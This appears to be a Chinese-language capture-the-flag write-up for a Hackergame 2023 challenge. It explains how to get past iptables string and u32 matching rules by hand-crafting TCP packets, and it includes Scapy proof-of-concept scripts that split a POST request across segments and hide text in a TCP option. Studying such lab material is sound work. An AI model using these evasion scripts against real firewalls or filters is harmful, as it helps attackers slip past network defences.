# Komm, süsser Flagge

## 0x00 First sight

看到这样的防火墙规则

```bash
*filter
:INPUT ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
:FORWARD DROP [0:0]
:myTCP-1 - [0:0]
:myTCP-2 - [0:0]
:myTCP-3 - [0:0]
-A INPUT -p tcp --dport 18080 -j myTCP-1
-A INPUT -p tcp --dport 18081 -j myTCP-2
-A INPUT -p tcp --dport 18082 -j myTCP-3

-A myTCP-1 -p tcp -m string --algo bm --string "POST" -j REJECT --reject-with tcp-reset

-A myTCP-2 -p tcp -m u32 --u32 "0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50" -j REJECT --reject-with tcp-reset

-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string "GET / HTTP" -j ACCEPT
-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset
COMMIT
```

简单看上去，就是三个规则，其中第二个规则要转转脑子，大概是这样：

- `myTCP-1` 需要你的POST包中不包含`POST`字符串，不然你就完蛋了
- `myTCP-2` 需要你POST包的第一个Payload不是`P`，（一些位运算，可以去看看TCP包结构，这里不赘述了）不然你就完蛋了
- `myTCP-3` 需要你GET包的前50个字符包含`GET / HTTP`字符串，不然你就完蛋了

## 0x01 Solution

发包，用网线鲨鱼(wireshark)抓包看结果。

### 0x0100 myTCP-1 & myTCP-2

什么？我的POST里面不能有POST？我天，这简直太酷了

由于这是个防火墙规则，不是WAF规则，这就变得十分好办了。咱只要手搓TCP包就可以了，
NGINX最终将会看到内核网络栈处理后的包内容。

我们知道，一个TCP连接是这样：

- 握手，SYN -> SYN/ACK -> ACK
- 发送数据，PSH -> ACK
- 断开连接，FIN -> ACK -> FIN/ACK -> ACK

防火墙会对每个包进行判断。这里我们的数据只会在PSH中推送到对方，这里只需要对PSH动手脚。

什么？POST请求不能有POST？那我有P和OST怎么样

rt，把POST拆了就行了。

PoC像这样：

```python
# Solution for 1 and 2 (dport 18081 and 18082)
# Need to bypass kernel's RST packet
# Like this iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <src> -j DROP
from scapy.all import *
import time
import random

# Ethernet Header
eth = Ether(dst='00:50:56:e0:be:cb')

# IP Header
ip = IP(dst='202.38.93.111')

# send_port = RandShort()
send_port = random.randint(1024, 65535)

# TCP Header
tcp = TCP(sport=send_port, dport=18081, flags="S", window=64240)

# Syn packet
syn = eth / ip / tcp
syn_ack = srp1(syn)

# TCP Header for Acknowledgment packet
tcp.flags = "A"
tcp.seq = syn_ack.ack
tcp.ack = syn_ack.seq + 1

# Acknowledgment packet
ack = eth / ip / tcp
sendp(ack)

# TCP Header for Push Acknowledgment packet
tcp.flags = "PA"

# Split POST request
data1 = "P"
# tcp.seq += 1  # Increment sequence number
push_ack1 = eth / ip / tcp / data1
sendp(push_ack1)

data2 = "OST / HTTP/1.1\r\nHost: 202.38.93.111:18081\r\nUser-Agent: curl/8.3.0\r\nAccept: */*\r\nContent-Length: 100\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nTOKENTOKEN我是TOKEN我不是TOKEN还有谁是TOKEN"
tcp.seq += len(data1)  # Increment sequence number
push_ack2 = eth / ip / tcp / data2
sendp(push_ack2)
```

这样你就能做好第一问了。

对于第二问，没错，这可以做第二问。

> 需要你POST包的第一个Payload不是`P`，（一些位运算，可以去看看TCP包结构，这里不赘述了）不然你就完蛋了

什么？难道单独发的 P 不是 P 了嘛？
其实这里是因为 u32 读东西是一下读 4 byte，而 P 只有 1 byte，所以就不会匹配到。具体可以去阅读 iptables 的 manpage。
这是非预期解，但是我就是把第一问的PoC放到第二问跑了一下，发现居然出了。

### 0x0101 myTCP-3

这题说，你要在POST包的前50字节内包含`GET / HTTP`。
你可以塞在TCPOptions里面。这里我塞在 SAckOK

对了，这里我没放eth，因为加了eth我的payload被挤到外面去了。
我用了他们提供的OpenVPN，可以成功发包。
PoC是由前一问的小改了一下。

```python
# Solution for 3
# Need to bypass kernel's RST packet
# Like this iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <src> -j DROP
from scapy.all import *
import time
import random

# IP Header
ip = IP(dst='192.168.23.1')

# send_port = RandShort()
send_port = random.randint(1024, 65535)

# TCP Header
tcp = TCP(sport=send_port, dport=18081, flags="S", window=64240, options=[('SAckOK', 'GET / HTTP')])

# Syn packet
syn = ip / tcp
syn_ack = srp1(syn)

# TCP Header for Acknowledgment packet
tcp.flags = "A"
tcp.seq = syn_ack.ack
tcp.ack = syn_ack.seq + 1

# Acknowledgment packet
ack = ip / tcp
sendp(ack)

# TCP Header for Push Acknowledgment packet
tcp.flags = "PA"

# Split POST request
data1 = "P"
# tcp.seq += 1  # Increment sequence number
push_ack1 = ip / tcp / data1
sendp(push_ack1)

data2 = "OST / HTTP/1.1\r\nHost: 202.38.93.111:18081\r\nUser-Agent: curl/8.3.0\r\nAccept: */*\r\nContent-Length: 100\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nTOKENTOKEN我是TOKEN我不是TOKEN还有谁是TOKEN"
tcp.seq += len(data1)  # Increment sequence number
push_ack2 = ip / tcp / data2
sendp(push_ack2)
```

应该是可以的。[官方题解](https://github.com/USTC-Hackergame/hackergame2023-writeups/tree/master/official/Komm%2C%20s%C3%BCsser%20Flagge)说，这东西可能因系统而异，不过他用c写的，不太懂，我贴这算了：

> 出题人在测试的时候发现一个小问题，取决于内核的编译参数，setsockopt 可能会以不同的方式验证参数合法性。例如，Ubuntu 20.04 和 22.04 下，只有 option 7 / 68 / 148 可以通过 setsockopt，但是换到 Debian 下，这三个 option 都不能正常设置（invalid argument），而除此之外的几乎所有 option 数值都可以正常设置。所以这里你需要根据自己的发行版尝试不同的 option 数值。本文末尾提供的 sol3.c 包含了一个循环，尝试所有的 option。

## 0x02 What

这题主要是看你能不能手搓TCP包。
